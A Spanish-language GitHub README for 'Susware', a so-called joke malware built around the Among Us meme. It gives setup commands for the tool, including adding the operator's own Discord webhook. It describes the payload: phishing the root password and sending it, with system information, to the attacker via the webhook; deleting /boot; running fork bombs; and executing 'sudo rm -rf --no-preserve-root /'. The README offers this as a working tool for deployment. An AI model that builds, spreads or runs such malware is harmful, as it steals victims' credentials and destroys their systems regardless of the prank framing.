<h1 align="center"><i>Susware</i></h1>

<div align="center">
<img src=https://img.shields.io/github/stars/lVoidi/susware-source?style=for-the-badge&logo=appveyor&color=informational />
<img src=https://img.shields.io/github/forks/lVoidi/susware-source?style=for-the-badge&logo=appveyor&color=informational />
<img src=https://img.shields.io/github/issues/lVoidi/susware-source?style=for-the-badge&logo=appveyor&color=informational />
<img src=https://img.shields.io/github/issues-pr/lVoidi/susware-source?style=for-the-badge&logo=appveyor&color=informational />
</div>

<p align="center" >
     <img src="https://thumbs.gfycat.com/ClutteredWealthyGoitered-max-1mb.gif" width=64>
</p>

-----

<div align="center">
     <details open="open">
     <summary>Referencias</summary>
     <b><a href="#susware">¿Qué es susware?</a></b><br>
     <b><a href="#install">Instalación</a></b><br>
     <b><a href="#funcionamiento">Funcionamiento</a></b><br>
     <b><a href="#contact">Contacto</a></b><br>
     </details>
</div>

-----

<h2 align="center">Agradecimientos</h2>

- ***[⌌Br3fuck⌏](https://github.com/Br3Fuck)***
     - Fork del webhook spyware: ***[WebhookHardware](https://github.com/Br3Fuck/WebhookHardware)***
     - Contribuidor del proyecto
     - Ayuda con estilo css

-----

<div align="center" id="susware">
     <h3> ¿Que es susware?</h3>  
     <p align="justify">
          Susware es un malware joke hecho con el objetivo de sacar una sonrisa, el 
          Susware puede entrar dentro de 3 categorías : 
               <b>• Virus joke</b>  ; 
               <b>• Troyano</b> ;
               <b>• Spyware</b> . 
          Es un virus joke porque básicamente está basado en el meme de Among Us, 
          también entra dentro de la categoría de troyano porque básicamente elimina el sistema operativo 
          y también es un spyware porque manda <b>la información del usuario</b> que lo ejecuta al atacante, usando un <b>webhook de discord</b> <br> 
     </p>
     <br>
     <br>
     <br>
     <h3> Lenguajes usados en el projecto</h3>
     <img src="https://media.discordapp.net/attachments/845471921990008835/853866822112378900/usedlanguages.png">

</div>

-----

<div align="center" id="install">
     <h3>Instalación del software</h3>
     <br>
     <p align="justify">
Para instalar el susware, es muy sencillo. <br>
<br>
En el caso <b>de linux</b>, tendrás que poner los siguientes comandos
</p>
<p align="justify">

```bash
# Primero copiamos el git y entramos a la carpeta de linux dentro del git copiado
# Segundo, ejecutamos autoinstall.py
git clone https://github.com/lVoidi/susware-source sus && cd sus/linux && python3 autoinstall.py

# Ahora, tenemos que asociar un webhook con el virus
# Para esto, tenemos que crear un webhook de discord y copiar su url
# Una vez tenemos la URL del webhook, hacemos vim a main.py y buscamos
# la línea número 64, en la funcion user_info
# buscas el apartado de webhook y donde dice "link del webhook", lo quitas
# y pones el link del webhook tuyo DENTRO de las comillas
# Una vez hecho todo esto, simplemente ejecutamos

python3 main.py

# Y empezará a correr el virus
```

</p>

<p align="justify">
Una vez <b>hecho esto</b>, el virus te va a pedir tu contraseña root, este es una especie de "engaño" <br>
para poder mandar tu contraseña por medio del webhook, en esta seccion, puedes poner lo que quieras, <br>
de igual manera, el webhook está controlado por tí
<br>
<br>
Recuerda no integrar el webhook en un server público, porque el webhook, trae la siguiente información consigo <br>
</p>

<img src="https://media.discordapp.net/attachments/845471921990008835/853686103516250152/embed.png" width=1024>

<br>
     
</div>

-----

<div align="center" id="funcionamiento">
     <h3>Funcionamiento</h3>
     <p align="justify">
A continuación, <b>se presenta</b> el funcionamiento de cada uno de los archivos
     </p>



</div>

-----
<div align="center">
<h3>Primera fase: <b>Empiezan a pasar cosas raras</b></h3>
<p align="justify">
Esta fase empieza por borrar el boot del sistema, osea, la carpeta <b><a href="https://en.wikipedia.org/wiki//boot" target="_blank">/boot/</a></b>, la cual contiene básicamente el <b><a href="https://en.wikipedia.org/wiki/GRUB" target="_blank">grub</a></b>, el cual es el <strong>principal encargado de arrancar un sistema linux</strong><br>
<br>
<b><a href="https://github.com/lVoidi/susware-source/blob/b33e7b4b5bb4cd6ed9afd8915b06c571f20506cb/linux/main.py#L66">Línea de código exacta en la que pasa esto</a></b><br>
<br>
<b>pero esto no acaba aquí</b>, porque despues de que haya eliminado el grub, usará el <a href="https://discord.com/developers/docs/resources/webhook">webhook</a> integrado en el código (el cual no funcionará si no pones alguna url de algun webhook en <a href="https://github.com/lVoidi/susware-source/blob/b1177a04833640206e79aa9662fc0f7d30e23412/linux/main.py#L65">esta línea</a>) mandará un embed con la información del sistema de donde se ejecuta, como <b>como he mencionado antes <a href="#install">aqui<a/></b><br>
<br>
Lo último que pasa en esta fase, es que empieza a abrir pestañas del navegador con diferentes búsquedas, la lista de búsquedas que hace es <b>la siguiente</b><br>

```python
 tup_searches = (
     'https://www.google.com/search?q=como+eliminar+virus+troyano+linux+atacante',
     'https://www.google.com/search?q=ayuda+mi+computador+hace+cosas+raras',
     'https://www.google.com/search?q=por+que+mi+pc+abre+pestañas+aleatorias',
     'https://www.google.com/search?q=descargar+hack+among+us+2020+octubre',
     'https://www.google.com/search?q=como+curar+el+conjuntivitis',
     'https://www.google.com/search?q=que+hacer+si+me+embargan+la+casa',
     'https://www.google.com/search?q=descargar+minecraft+premium+gratis+linux+tentador+2020',
     'http://4.bp.blogspot.com/-w6UkeTKqd3E/UpdEMzDKJFI/AAAAAAAAFEE/rh0BkH-AklU/s1600   3d-trollface-nodding-ok-yes-agree-troll-face.gif'
)
```
<br>
Todo esto está documentado en <a href="https://github.com/lVoidi/susware-source/blob/4fd53df9693122e46dd57cce9ad73103293a1e16/linux/src/behavior.py#L21">esta función</a><br>
<br>

Aquí no se acaba esta fase, el virus empieza a abrir emuladores de terminales para hacer que sea difícil el encontrar la terminal original

<img src="https://media.discordapp.net/attachments/819360638182228038/853654640864657428/unknown.png?width=1124&height=632">


</p>

</div>

-----

<div align="center">
<h3>Segunda fase: Capturas de pantalla</h3>

<p align="justify">
Aqui es donde se comienza a poner divertido el virus, porque éste empieza a tomar capturas de pantalla del pc entero y las pone de fondo de pantalla, por ahora, no he testeado en <b>entornos reales</b> esta función, por ahora solo la he probado en máquina virtual de <b><a href="https://www.kali.org/">kali linux </a></b>.<br>
<b><a href="https://github.com/lVoidi/susware-source/blob/4b1c6f94132b27404f5183cebbd5c37d34e2983e/linux/src/wallpaper.py#L21">Funcion que toma las capturas</a></b>
<br>
Mientras todo esto pasa, el <b><a href="https://i.ytimg.com/an_webp/grd-K33tOSM/mqdefault_6s.webp?du=3000&sqp=CP-kn4YG&rs=AOn4CLDSq77xBfYv0OWUNxH10INvbccgjw">among drip</a></b> estará sonando de fondo

Esta funcion que toma capturas, cada vez va bajando el tiempo de <a href="https://www.journaldev.com/15797/python-time-sleep#:~:text=Python%20time%20sleep%20function%20is,only%2C%20not%20the%20whole%20program.">sleep</a>, el cual se encarga de asegurarse de que si ponga las capturas de pantalla como wallpaper. <a href="https://github.com/lVoidi/susware-source/blob/4b1c6f94132b27404f5183cebbd5c37d34e2983e/linux/src/wallpaper.py#L97">Aquí</a> puedes ver esa parte del código si entiendes python, esta todo documentado aun si no lo entiendes muy bien.<br>
Pero esto no es todo, el virus empieza a ralentizar el computador creando 300 archivos de texto en el escritorio, todos con la frase "SO SUSSY", y todos llevando la misma nomenclatura en el nombre, de <b>"SUSSY(numero del 1 al 300)"</b>
<b><a href="https://github.com/lVoidi/susware-source/blob/004b247451250caa1d7ba1839084fcbb3bdb2757/linux/src/behavior.py#L65">línea en donde sucede esto</a></b>

</p>
<h4>Imagen ilustrativa de esta fase</h4>

<img src="https://media.discordapp.net/attachments/819360638182228038/853654715032535080/unknown.png?width=1124&height=632">
</div>

-----

<div align="center">
<h3>Fase 3: el final</h3>
<p align="justify">
Sabes que el fin ha llegado cuando la siguiente imagen se imprime en pantalla
</p>

<img src="https://media.discordapp.net/attachments/819360638182228038/853647749441650688/unknown.png?width=796&height=633">
<p align="justify">
Esto significa que el virus ya está ejecutando 5 fork bombs y en 10 segundos empezará la destrucción del sistema operativo, con el uso del comando <b><code>sudo rm -rf --no-preserve-root /</code></b><br>
La destrucción total del sistema operativo sucede corrutinamente con las otras funciones antes mencionadas, lo que pasa es que ahora las capturas de pantalla y wallpapers se estarán poniendo cada 0.1s, ralentizando el sistema operativo desde el que se ejecuta, añadiendo el factor de las 5 fork bombs antes mencionadas, que le dan un mayor toque de destrucción 
</p>
</div>

-----

<h3 id="contact">Contacto</h3>

<p align="justify">
Si quieres contactarme, puedes optar por los siguientes medios

- **[Telegram](https://t.me/lVoidi)** 

- **[Discord](https://discord.gg/4zDWYyrReW)**

- **[Issues](https://github.com/lVoidi/susware-source/issues)**

</p>

-----

<div align="center">

<h2><a href="https://discord.gg/4zDWYyrReW" target="_blank">Unete a mi server de discord!</a></h2>

<img src="https://discordapp.com/api/guilds/844729426843402271/widget.png?style=banner4" width="256">

</div>
